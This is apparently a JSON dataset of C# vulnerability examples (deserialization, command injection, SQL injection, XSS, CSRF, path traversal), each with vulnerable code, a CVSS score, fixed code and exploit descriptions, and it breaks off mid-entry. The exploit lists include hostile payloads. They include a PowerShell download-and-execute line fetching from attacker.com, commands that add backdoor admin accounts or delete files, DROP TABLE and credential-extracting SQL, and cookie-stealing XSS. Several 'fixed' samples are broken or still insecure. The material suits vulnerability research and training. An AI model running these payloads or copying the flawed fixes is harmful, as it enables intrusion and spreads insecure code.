{
    "c#_0": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "using System;\nusing System.IO;\nusing System.Runtime.Serialization.Formatters.Binary;\nclass VulnerableClass {\n    public static void DeserializeObject(string filePath) {\n        BinaryFormatter formatter = new BinaryFormatter();\n        using (FileStream stream = new FileStream(filePath, FileMode.Open)) {\n            object obj = formatter.Deserialize(stream);\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\nusing System.IO;\nusing Newtonsoft.Json;\nclass SecureClass {\n    public static void DeserializeObject(string filePath) {\n        string json;\n        using (StreamReader stream = new StreamReader(filePath)) {\n            json = stream.ReadToEnd();\n        }\n        object obj = JsonConvert.DeserializeObject(json);\n    }\n}",
        "exploit_ways": [
            "An attacker can craft a malicious serialized object to execute arbitrary code.",
            "Could use deserialization to perform remote code execution if the object graph is manipulated.",
            "By injecting specially crafted data, an attacker might be able to achieve denial of service by crashing the application."
        ]
    },
    "c#_1": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "using System.Security.Principal;\npublic class Exploit {\n    public void CheckPrivileges() {\n        WindowsIdentity identity = WindowsIdentity.GetCurrent();\n        WindowsPrincipal principal = new WindowsPrincipal(identity);\n        if (!principal.IsInRole(WindowsBuiltInRole.Administrator)) {\n            // Simulate a hard to detect privilege escalation attempt\n            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(\"cmd.exe\", \"/c net user hacker Hacker123! /add\"));\n        }\n    }\n}",
        "cvss_score": 8.5,
        "fixed_code": "using System.Security.Principal;\npublic class Exploit {\n    public void CheckPrivileges() {\n        WindowsIdentity identity = WindowsIdentity.GetCurrent();\n        WindowsPrincipal principal = new WindowsPrincipal(identity);\n        if (!principal.IsInRole(WindowsBuiltInRole.Administrator)) {\n            throw new UnauthorizedAccessException(\"User does not have the necessary privileges.\");\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can execute CheckPrivileges() to create a new admin user named 'hacker' with password 'Hacker123!'.",
            "If run in an automated context, it could be used to add unauthorized users regularly.",
            "This method can be triggered by any non-admin user to escalate their privileges."
        ]
    },
    "c#_2": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "using System;\nclass VulnerableClass {\n    public unsafe void UnsafeMethod() {\n        char* buffer = stackalloc char[16];\n        Console.WriteLine(\"Enter a string:\");\n        string input = Console.ReadLine();\n        for (int i = 0; i < input.Length; i++) {\n            buffer[i] = input[i];\n        }\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "using System;\nclass SafeClass {\n    public void SafeMethod() {\n        Console.WriteLine(\"Enter a string:\");\n        string input = Console.ReadLine();\n        char[] buffer = new char[16];\n        int length = Math.Min(input.Length, 16);\n        for (int i = 0; i < length; i++) {\n            buffer[i] = input[i];\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a string longer than 16 characters to overwrite adjacent memory locations.",
            "By carefully crafting the input, an attacker could execute arbitrary code using return address overwriting.",
            "This vulnerability might allow for privilege escalation if exploited correctly within a privileged application context."
        ]
    },
    "c#_3": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "using System.Security.Cryptography;\nusing System.Text;\nusing System.Linq;\nusing System.Collections.Generic;\nusing System.Diagnostics;\nusing System.Numerics;\nusing System;\nclass AuthenticationManager {\n    private string _hashedPassword = \"e10adc3949ba59abbe56e057f20f883e\"; // Hash for \\\"password123\\\"\n\n    public bool Authenticate(string username, string password) {\n        if (username == \\\"admin\\\") {\n            using (SHA1 sha1 = SHA1.Create()) {\n                byte[] hashBytes = sha1.ComputeHash(Encoding.UTF8.GetBytes(password));\n                StringBuilder sb = new StringBuilder();\n                foreach (byte b in hashBytes) {\n                    sb.Append(b.ToString(\\\"x2\\\"));\n                }\n                return _hashedPassword == sb.ToString();\n            }\n        }\n        return false;\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System.Security.Cryptography;\nusing System.Text;\nusing System.Linq;\nusing System.Collections.Generic;\nusing System.Diagnostics;\nusing System.Numerics;\nusing System;\nclass AuthenticationManager {\n    private string _hashedPassword = \"e10adc3949ba59abbe56e057f20f883e\"; // Hash for \\\"password123\\\"\n\n    public bool Authenticate(string username, string password) {\n        if (username == \\\"admin\\\") {\n            using (SHA256 sha256 = SHA256.Create()) {\n                byte[] hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(password));\n                StringBuilder sb = new StringBuilder();\n                foreach (byte b in hashBytes) {\n                    sb.Append(b.ToString(\\\"x2\\\"));\n                }\n                return _hashedPassword == sb.ToString();\n            }\n        }\n        return false;\n    }\n}",
        "exploit_ways": [
            "An attacker can brute-force the password for the admin account using known hash vulnerabilities.",
            "By gaining access to the source code or compiled binaries, an attacker can extract the hardcoded hash and attempt to crack it offline.",
            "If other parts of the application are insecure, an attacker might exploit them to gain access to the server files containing the authentication logic."
        ]
    },
    "c#_4": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "using System;\n\npublic class UnsafeClass {\n    public static void UnsafeFunction() {\n        unsafe {\n            int* ptr = stackalloc int[10];\n            for (int i = 0; i < 20; i++) {\n                ptr[i] = i;\n            }\n        }\n    }\n}",
        "cvss_score": 8.6,
        "fixed_code": "using System;\nusing System.Collections.Generic;\n\npublic class SafeClass {\n    public static void SafeFunction() {\n        List<int> numbers = new List<int>();\n        for (int i = 0; i < 20; i++) {\n            numbers.Add(i);\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could manipulate the input to cause the program to overwrite adjacent memory.",
            "By causing a buffer overflow, an attacker might be able to inject malicious code into the process's memory space.",
            "Exploiting the overflow can lead to control of the execution flow, potentially leading to privilege escalation."
        ]
    },
    "c#_5": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "public void RunCommand(string command) { System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + command); }",
        "cvss_score": 8.2,
        "fixed_code": "public void RunCommand(string command) { string[] allowedCommands = { \"dir\", \"whoami\" }; if (allowedCommands.Contains(command)) { using (Process process = new Process()) { process.StartInfo.FileName = \"cmd.exe\"; process.StartInfo.Arguments = \"/c \" + command; process.StartInfo.UseShellExecute = false; process.Start(); } } else { throw new ArgumentException(\"Command not allowed\"); } }",
        "exploit_ways": [
            "An attacker can input 'takeown /f C:\\\\importantfile.txt' to take ownership of critical files.",
            "They could use 'net user admin Admin123! /add && net localgroup administrators admin /add' to create a new admin account.",
            "Input like 'shutdown /s /t 0' can perform unauthorized system shutdown."
        ]
    },
    "c#_6": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "using System;\n\npublic class Program {\n    public static void Main(string[] args) {\n        Console.WriteLine(\"Enter command:\");\n        string command = Console.ReadLine();\n        System.Diagnostics.Process.Start(command);\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\n\npublic class Program {\n    public static void Main(string[] args) {\n        Console.WriteLine(\"Enter command:\");\n        string command = Console.ReadLine();\n        string[] allowedCommands = { \"dir\", \"echo\" };\n        if (Array.Exists(allowedCommands, element => element == command)) {\n            System.Diagnostics.Process.Start(command);\n        } else {\n            Console.WriteLine(\"Command not allowed.\");\n        }\n    }\n}",
        "exploit_ways": [
            "User could input 'cmd /c del *' to delete all files in the directory.",
            "Could use 'cmd /c powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/malware.ps1')\"' to execute remote malicious PowerShell script.",
            "Could chain commands like 'cmd /c dir & whoami' to list directory contents and reveal current user."
        ]
    },
    "c#_7": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "string GetUnsafeHtml(string userInput) {\n    return \"<div>\" + userInput + \"</div>\";\n}",
        "cvss_score": 6.1,
        "fixed_code": "using System.Web;\n\nstring GetSafeHtml(string userInput) {\n    string safeInput = HttpUtility.HtmlEncode(userInput);\n    return \"<div>\" + safeInput + \"</div>\";\n}",
        "exploit_ways": [
            "An attacker can inject a script like '<script>alert(\\'XSS\\')</script>' to execute arbitrary JavaScript.",
            "Can use '<img src=x onerror=alert(1)>' to trigger the onerror event and run malicious code.",
            "Injecting '<a href=javascript:alert(document.cookie)>Click me</a>' can steal user cookies by prompting them to click."
        ]
    },
    "c#_8": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "using System;\r\nusing System.Data.SqlClient;\r\nclass VulnerableApp {\r\n    public void ExecuteQuery(string userInput) {\r\n        string connectionString = \"Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;\";\r\n        using (SqlConnection connection = new SqlConnection(connectionString)) {\r\n            string query = \"SELECT * FROM Users WHERE Username='\" + userInput + \"'\";\r\n            SqlCommand command = new SqlCommand(query, connection);\r\n            SqlDataReader reader = command.ExecuteReader();\r\n            while (reader.Read()) {\r\n                Console.WriteLine(reader[0]);\r\n            }\r\n        }\r\n    }\r\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\r\nusing System.Data.SqlClient;\r\nclass SecureApp {\r\n    public void ExecuteQuery(string userInput) {\r\n        string connectionString = \"Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;\";\r\n        using (SqlConnection connection = new SqlConnection(connectionString)) {\r\n            string query = \"SELECT * FROM Users WHERE Username=@Username\";\r\n            SqlCommand command = new SqlCommand(query, connection);\r\n            command.Parameters.AddWithValue(\"@Username\", userInput);\r\n            SqlDataReader reader = command.ExecuteReader();\r\n            while (reader.Read()) {\r\n                Console.WriteLine(reader[0]);\r\n            }\r\n        }\r\n    }\r\n}",
        "exploit_ways": [
            "An attacker can input \"admin' OR '1'='1\" to bypass authentication.",
            "They can use SQL injection with a UNION SELECT statement to retrieve sensitive data from other tables.",
            "Input like \"'; DROP TABLE Users; --\" can be used to delete the Users table."
        ]
    },
    "c#_9": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "using System;\npublic class UserInputProcessor {\n    public void ProcessInput(string userInput) {\n        string command = \"echo \" + userInput;\n        System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + command);\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "using System;\npublic class UserInputProcessor {\n    public void ProcessInput(string userInput) {\n        string[] args = { \"/c\", \"echo\", userInput };\n        System.Diagnostics.Process.Start(\"cmd.exe\", args);\n    }\n}",
        "exploit_ways": [
            "User could input '& del /q *' to delete all files in the current directory.",
            "Could use '&& ipconfig > output.txt' to capture network configuration and save it to a file.",
            "Chain commands like '| whoami' to leak the identity of the running process."
        ]
    },
    "c#_10": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "using System.Web.Mvc;\n\npublic class AccountController : Controller\n{\n    [HttpPost]\n    public ActionResult Transfer(string targetAccount, decimal amount)\n    {\n        // Assume this method transfers money to another account.\n        if (amount > 0)\n        {\n            // Simulate a transfer operation\n            ViewBag.Message = \"Transfer successful!\";\n        }\n        return View();\n    }\n}",
        "cvss_score": 8.5,
        "fixed_code": "using System.Web.Mvc;\n\npublic class AccountController : Controller\n{\n    [HttpPost]\n    [ValidateAntiForgeryToken]\n    public ActionResult Transfer(string targetAccount, decimal amount)\n    {\n        // Assume this method transfers money to another account.\n        if (amount > 0)\n        {\n            // Simulate a transfer operation\n            ViewBag.Message = \"Transfer successful!\";\n        }\n        return View();\n    }\n}",
        "exploit_ways": [
            "An attacker can trick the user into clicking on a malicious link that sends a POST request to perform unauthorized transfers.",
            "Using a CSRF token mechanism could be bypassed by social engineering, leading to unauthorized transactions.",
            "A crafted email with an embedded form that auto-submits upon opening can exploit this vulnerability to execute unwanted actions."
        ]
    },
    "c#_11": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "using System;\npublic class VulnerableClass {\n    public void UnsafeMethod(string input) {\n        char[] buffer = new char[10];\n        input.CopyTo(0, buffer, 0, input.Length);\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\npublic class SecureClass {\n    public void SafeMethod(string input) {\n        if (input.Length > 10) {\n            throw new ArgumentException(\"Input is too long\");\n        }\n        char[] buffer = new char[10];\n        input.CopyTo(0, buffer, 0, input.Length);\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a string longer than 10 characters to overwrite adjacent memory.",
            "This could lead to executing arbitrary code by overwriting the return address on the stack.",
            "By crafting the input carefully, an attacker might be able to manipulate program flow and gain unauthorized access."
        ]
    },
    "c#_12": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "using System;\nusing System.Web.UI;\n\npublic partial class Default : Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        if (!IsPostBack)\n        {\n            string userInput = Request.QueryString[\"data\"];\n            if (userInput != null)\n            {\n                LiteralControl ctrl = new LiteralControl();\n                ctrl.Text = $\"<div>{userInput}</div>\";\n                this.Controls.Add(ctrl);\n            }\n        }\n    }\n}",
        "cvss_score": 8.6,
        "fixed_code": "using System;\nusing System.Web.UI;\n\npublic partial class Default : Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        if (!IsPostBack)\n        {\n            string userInput = Request.QueryString[\"data\"];\n            if (userInput != null)\n            {\n                LiteralControl ctrl = new LiteralControl();\n                ctrl.Text = $\"<div>{Server.HtmlEncode(userInput)}</div>\";\n                this.Controls.Add(ctrl);\n            }\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can inject a script like '<script>alert(\\'XSS\\')</script>' to execute arbitrary JavaScript.",
            "They could use '<img src=x onerror=alert(document.cookie)>' to steal cookies or sensitive data.",
            "Exploiting with '<iframe src=https://attacker.com></iframe>' might load malicious content within the page."
        ]
    },
    "c#_13": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "using System;\npublic class UserInputHandler {\n    private void ExecuteCommand(string command) {\n        // Simulated method to execute a command\n        Console.WriteLine(\\\"Executing command: \\\" + command);\n    }\n    public void ProcessUserInput() {\n        Console.Write(\\\"Enter your command: \\\\n\\\");\n        string userInput = Console.ReadLine();\n        string sanitizedCommand = SanitizeInput(userInput);\n        ExecuteCommand(sanitizedCommand);\n    }\n    private string SanitizeInput(string input) {\n        // Incomplete and flawed sanitization attempt\n        if (input.Contains(\\\";\\\") || input.Contains(\\\"&\\\") || input.Contains(\\\"|\\\")) {\n            throw new ArgumentException(\\\"Invalid command!\\\");\n        }\n        return input;\n    }\n}",
        "cvss_score": 8.5,
        "fixed_code": "using System;\npublic class UserInputHandler {\n    private void ExecuteCommand(string[] command) {\n        // Simulated method to execute a command\n        Console.WriteLine(\\\"Executing command: \\\" + string.Join(\\\" \\\", command));\n    }\n    public void ProcessUserInput() {\n        Console.Write(\\\"Enter your command: \\\\n\\\");\n        string userInput = Console.ReadLine();\n        if (userInput.Equals(\\\"whoami\\\") || userInput.Equals(\\\"ls\\\")) {\n            ExecuteCommand(new string[] { userInput });\n        } else {\n            Console.WriteLine(\\\"Not allowed\\\");\n        }\n    }\n}",
        "exploit_ways": [
            "User could input 'whoami && dir' to execute additional commands.",
            "Could potentially chain commands like 'ls; rm -rf /' if sanitization fails.",
            "Using a crafted payload like 'echo test > temp.txt' to create and write to files."
        ]
    },
    "c#_14": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "using System;\nusing System.Data.SqlClient;\nclass DatabaseManager {\n    private string connectionString = \"Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;\";\n    public void ExecuteQuery(string userInput) {\n        using (SqlConnection connection = new SqlConnection(connectionString)) {\n            string query = \"SELECT * FROM Users WHERE Username=\" + userInput;\n            SqlCommand command = new SqlCommand(query, connection);\n            connection.Open();\n            SqlDataReader reader = command.ExecuteReader();\n            while (reader.Read()) {\n                Console.WriteLine(reader[0]);\n            }\n        }\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "using System;\nusing System.Data.SqlClient;\nclass DatabaseManager {\n    private string connectionString = \"Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;\";\n    public void ExecuteQuery(string userInput) {\n        using (SqlConnection connection = new SqlConnection(connectionString)) {\n            string query = \"SELECT * FROM Users WHERE Username=@username\";\n            SqlCommand command = new SqlCommand(query, connection);\n            command.Parameters.AddWithValue(\"@username\", userInput);\n            connection.Open();\n            SqlDataReader reader = command.ExecuteReader();\n            while (reader.Read()) {\n                Console.WriteLine(reader[0]);\n            }\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'admin' OR '1'='1' to bypass authentication.",
            "They can use '--' to comment out the rest of the query, potentially accessing unauthorized data or modifying tables.",
            "Input like '; DROP TABLE Users' can delete critical data."
        ]
    },
    "c#_15": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "using System;\nclass DatabaseManager {\n    private string connectionString = \"Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;\";\n    public void ExecuteQuery(string query) {\n        using (var connection = new System.Data.SqlClient.SqlConnection(connectionString)) {\n            var command = new System.Data.SqlClient.SqlCommand(query, connection);\n            connection.Open();\n            command.ExecuteNonQuery();\n        }\n    }\n}",
        "cvss_score": 8.5,
        "fixed_code": "using System;\nclass DatabaseManager {\n    private string connectionString = \"Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=myPassword;\";\n    public void ExecuteQuery(string query, params object[] parameters) {\n        using (var connection = new System.Data.SqlClient.SqlConnection(connectionString)) {\n            var command = new System.Data.SqlClient.SqlCommand(query, connection);\n            for (int i = 0; i < parameters.Length; i++)\n                command.Parameters.AddWithValue(\"@p\" + i, parameters[i]);\n            connection.Open();\n            command.ExecuteNonQuery();\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can input a malicious query like 'SELECT * FROM Users WHERE Username = '' OR 1=1' to retrieve all user data.",
            "By using a crafted SQL payload, an attacker can drop tables or perform other destructive operations on the database.",
            "The vulnerability allows for blind SQL injection where attackers can extract information by observing application behavior in response to input."
        ]
    },
    "c#_16": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "using System;\nusing System.Web.Mvc;\n\nnamespace VulnerableApp.Controllers {\n    public class AccountController : Controller {\n        [HttpPost]\n        public ActionResult Transfer(string recipient, decimal amount) {\n            // Simulate transferring funds to another account without CSRF protection\n            ViewBag.Message = $\"Transferred ${amount} to {recipient}\";\n            return View();\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\nusing System.Web.Mvc;\n\nnamespace SecureApp.Controllers {\n    public class AccountController : Controller {\n        [HttpPost]\n        [ValidateAntiForgeryToken]\n        public ActionResult Transfer(string recipient, decimal amount) {\n            // Simulate transferring funds to another account with CSRF protection\n            ViewBag.Message = $\"Transferred ${amount} to {recipient}\";\n            return View();\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can craft a malicious web page that triggers a transfer to their account when the victim visits it while logged into the vulnerable site.",
            "Attackers can use phishing emails containing links or embedded images pointing to crafted URLs that perform unauthorized actions on behalf of authenticated users.",
            "By embedding a hidden form in a webpage and using JavaScript to submit it automatically, attackers can initiate transfers without user interaction."
        ]
    },
    "c#_17": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "using System.Web.Mvc;\n\npublic class UserController : Controller\n{\n    public ActionResult ChangeEmail(string newEmail)\n    {\n        // Vulnerable to CSRF as there is no anti-forgery token\n        // Update user's email without verifying the request origin\n        var userId = Session[\"UserId\"];\n        UpdateUserEmail(userId, newEmail);\n        return RedirectToAction(\"Profile\");\n    }\n\n    private void UpdateUserEmail(object userId, string newEmail)\n    {\n        // Database update logic here\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "using System.Web.Mvc;\n\npublic class UserController : Controller\n{\n    [ValidateAntiForgeryToken]\n    public ActionResult ChangeEmail(string newEmail)\n    {\n        var userId = Session[\"UserId\"];\n        UpdateUserEmail(userId, newEmail);\n        return RedirectToAction(\"Profile\");\n    }\n\n    private void UpdateUserEmail(object userId, string newEmail)\n    {\n        // Database update logic here\n    }\n}",
        "exploit_ways": [
            "An attacker can trick a logged-in user into clicking a malicious link to change their email.",
            "A crafted HTML form with a hidden CSRF token from another site can be used to perform actions without the user's knowledge.",
            "Using JavaScript, an attacker could programmatically submit a request to change the user's details."
        ]
    },
    "c#_18": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "public string GetUserDetails(string userId) {\n    string query = \"SELECT * FROM Users WHERE id = \" + userId;\n    return ExecuteQuery(query);\n}",
        "cvss_score": 7.5,
        "fixed_code": "public string GetUserDetails(string userId) {\n    using (var command = new SqlCommand()) {\n        command.CommandText = \"SELECT * FROM Users WHERE id = @userId\";\n        command.Parameters.AddWithValue(\"@userId\", userId);\n        return ExecuteQuery(command);\n    }\n}",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve all user details.",
            "They can use '1; DROP TABLE Users' to delete the Users table.",
            "Input like '1 UNION SELECT username, password FROM admin_table' can extract admin credentials."
        ]
    },
    "c#_19": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "using System;\r\nusing System.IO;\r\nusing System.Runtime.Serialization.Formatters.Binary;\r\nclass Program {\r\n    static void Main(string[] args) {\r\n        BinaryFormatter formatter = new BinaryFormatter();\r\n        using (FileStream stream = new FileStream(\"data.bin\", FileMode.Open)) {\r\n            object obj = formatter.Deserialize(stream);\r\n        }\r\n    }\r\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\r\nusing System.IO;\r\nusing Newtonsoft.Json;\r\nclass Program {\r\n    static void Main(string[] args) {\r\n        string jsonData = File.ReadAllText(\"data.bin\");\r\n        object obj = JsonConvert.DeserializeObject(jsonData);\r\n    }\r\n}",
        "exploit_ways": [
            "An attacker could craft a malicious binary file that, when deserialized, executes arbitrary code.",
            "By manipulating the serialized data, an attacker can exploit type confusion vulnerabilities to perform unauthorized actions.",
            "A crafted payload could lead to denial-of-service conditions by causing excessive resource consumption during deserialization."
        ]
    },
    "c#_20": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "using System.Security.Principal;\nclass VulnerableClass {\n    public void RunAsAdmin() {\n        WindowsIdentity identity = WindowsIdentity.GetCurrent();\n        WindowsPrincipal principal = new WindowsPrincipal(identity);\n        if (principal.IsInRole(WindowsBuiltInRole.Administrator)) {\n            // Vulnerable: No proper validation or logging\n            System.Diagnostics.Process.Start(\"cmd.exe\", \"/c net user admin password /add && net localgroup administrators admin /add\");\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System.Security.Principal;\nclass SecureClass {\n    public void RunAsAdmin() {\n        WindowsIdentity identity = WindowsIdentity.GetCurrent();\n        WindowsPrincipal principal = new WindowsPrincipal(identity);\n        if (principal.IsInRole(WindowsBuiltInRole.Administrator)) {\n            // Secure: Log action and validate necessity\n            System.Diagnostics.EventLog.WriteEntry(\"User \" + identity.Name + \" attempted to run administrative commands.\", System.Diagnostics.EventLogEntryType.Information);\n            if (IsActionNecessary()) {\n                System.Diagnostics.Process.Start(\"cmd.exe\", \"/c net user admin securepassword123 /add && net localgroup administrators admin /add\");\n            }\n        } else {\n            throw new UnauthorizedAccessException();\n        }\n    }\n\n    private bool IsActionNecessary() {\n        // Implement necessary checks here\n        return true;\n    }\n}",
        "exploit_ways": [
            "An attacker with admin privileges can execute arbitrary commands via the vulnerable method to add users or modify groups.",
            "The vulnerability allows for potential persistence by adding a backdoor user to the system administrators group.",
            "Exploiting this could lead to unauthorized administrative access, enabling further attacks like data exfiltration or ransomware deployment."
        ]
    },
    "c#_21": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "using System;\r\nusing System.IO;\r\nusing System.Runtime.Serialization.Formatters.Binary;\r\nclass Program\r\n{\r\n    static void Main(string[] args)\r\n    {\r\n        Console.WriteLine(\"Enter serialized data:\");\r\n        string input = Console.ReadLine();\r\n        BinaryFormatter formatter = new BinaryFormatter();\r\n        using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(input)))\r\n        {\r\n            object obj = formatter.Deserialize(ms);\r\n        }\r\n    }\r\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\r\nusing System.IO;\r\nusing Newtonsoft.Json;\r\nclass Program\r\n{\r\n    static void Main(string[] args)\r\n    {\r\n        Console.WriteLine(\"Enter serialized data:\");\r\n        string input = Console.ReadLine();\r\n        try\r\n        {\r\n            object obj = JsonConvert.DeserializeObject(input);\r\n        }\r\n        catch (JsonException ex)\r\n        {\r\n            Console.WriteLine(\"Deserialization failed: \" + ex.Message);\r\n        }\r\n    }\r\n}",
        "exploit_ways": [
            "An attacker can craft a malicious payload to execute arbitrary code upon deserialization.",
            "They can use the payload to perform remote code execution, leading to system compromise.",
            "By injecting crafted serialized data, an attacker might escalate privileges or access sensitive information."
        ]
    },
    "c#_22": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "using System; class Program { unsafe static void Main(string[] args) { char* buffer = stackalloc char[16]; Console.WriteLine(\"Enter a string:\"); string input = Console.ReadLine(); for (int i = 0; i < input.Length; i++) { buffer[i] = input[i]; } Console.WriteLine(buffer); } }",
        "cvss_score": 7.5,
        "fixed_code": "using System;\nclass Program\n{\n    static void Main(string[] args)\n    {\n        char[] buffer = new char[16];\n        Console.WriteLine(\"Enter a string:\");\n        string input = Console.ReadLine();\n        int lengthToCopy = Math.Min(input.Length, 16);\n        input.CopyTo(0, buffer, 0, lengthToCopy);\n        Console.WriteLine(new string(buffer));\n    }\n}",
        "exploit_ways": [
            "An attacker can enter a string longer than 16 characters to overwrite adjacent memory, potentially changing program execution flow.",
            "Overwriting the return address on the stack with malicious code can lead to arbitrary code execution.",
            "By carefully crafting input, an attacker may be able to corrupt other variables or data structures located in adjacent memory space."
        ]
    },
    "c#_23": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "public void TransferFunds(string targetAccount, decimal amount) {\\n    if (Session[\"authenticated\"] != null && (bool)Session[\"authenticated\"]) {\\n        // Simulate fund transfer logic\\n        AccountService.Transfer(targetAccount, amount);\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "public void TransferFunds(string targetAccount, decimal amount, string antiForgeryToken) {\\n    if (Session[\"authenticated\"] != null && (bool)Session[\"authenticated\"]) {\\n        if (Request.Form[\"__RequestVerificationToken\"] == antiForgeryToken) {\\n            // Simulate fund transfer logic\\n            AccountService.Transfer(targetAccount, amount);\\n        } else {\\n            throw new InvalidOperationException(\"Invalid anti-forgery token.\");\\n        }\\n    }\\n}",
        "exploit_ways": [
            "An attacker can craft a malicious link or form that, when visited by an authenticated user, transfers funds from their account to the attacker's account.",
            "By embedding a CSRF attack in a forum post or email, an attacker can trick users into executing unauthorized actions on the application without their knowledge.",
            "Using social engineering techniques, an attacker can lure users to a malicious website that automatically submits a form to the vulnerable endpoint, exploiting the lack of protection against CSRF."
        ]
    },
    "c#_24": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "using System;\nusing System.IO;\npublic class FileManager {\n    private string basePath = @\"C:\\secure\\uploads\";\n    public void ReadFile(string fileName) {\n        try {\n            string fullPath = Path.Combine(basePath, fileName);\n            if (fullPath.StartsWith(basePath)) {\n                using (StreamReader reader = new StreamReader(fullPath)) {\n                    Console.WriteLine(reader.ReadToEnd());\n                }\n            } else {\n                throw new Exception(\"Access Denied\");\n            }\n        } catch (Exception ex) {\n            Console.WriteLine(ex.Message);\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\nusing System.IO;\npublic class FileManager {\n    private string basePath = @\"C:\\secure\\uploads\";\n    public void ReadFile(string fileName) {\n        try {\n            if (Path.GetFileName(fileName) != fileName || !Directory.Exists(basePath)) {\n                throw new Exception(\"Invalid file name\");\n            }\n            string fullPath = Path.Combine(basePath, fileName);\n            using (StreamReader reader = new StreamReader(fullPath)) {\n                Console.WriteLine(reader.ReadToEnd());\n            }\n        } catch (Exception ex) {\n            Console.WriteLine(ex.Message);\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could input '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts' to access the hosts file.",
            "They can specify a full path like 'C:\\Windows\\win.ini' to read system files.",
            "Using crafted paths with null bytes or other special characters might bypass checks in some environments."
        ]
    },
    "c#_25": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\r\n{\r\n    if (env.IsDevelopment())\r\n    {\r\n        app.UseDeveloperExceptionPage();\r\n    }\r\n\r\n    app.UseRouting();\r\n\r\n    app.UseEndpoints(endpoints =>\r\n    {\r\n        endpoints.MapControllers();\r\n    });\r\n}",
        "cvss_score": 2.6,
        "fixed_code": "public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\r\n{\r\n    if (env.IsDevelopment())\r\n    {\r\n        app.UseDeveloperExceptionPage();\r\n    }\r\n\r\n    app.UseHsts();\r\n    app.UseHttpsRedirection();\r\n    app.UseSecurityHeaders(new SecurityHeadersPolicy\r\n    {\r\n        ContentSecurityPolicy = \"default-src 'self';\",\r\n        XContentTypeOptions = \"nosniff\",\r\n        XXssProtection = \"1; mode=block\",\r\n        ReferrerPolicy = \"no-referrer\",\r\n        StrictTransportSecurity = \"max-age=31536000\"\r\n    });\r\n\r\n    app.UseRouting();\r\n\r\n    app.UseEndpoints(endpoints =>\r\n    {\r\n        endpoints.MapControllers();\r\n    });\r\n}",
        "exploit_ways": [
            "An attacker can perform a clickjacking attack due to the absence of X-Frame-Options or Content-Security-Policy headers.",
            "The application is vulnerable to cross-site scripting (XSS) attacks because there are no appropriate security headers like X-XSS-Protection.",
            "Without HSTS, an attacker could intercept traffic if the user visits the site over HTTP."
        ]
    },
    "c#_26": {
        "vulnerability_type": "HTTP Response Splitting",
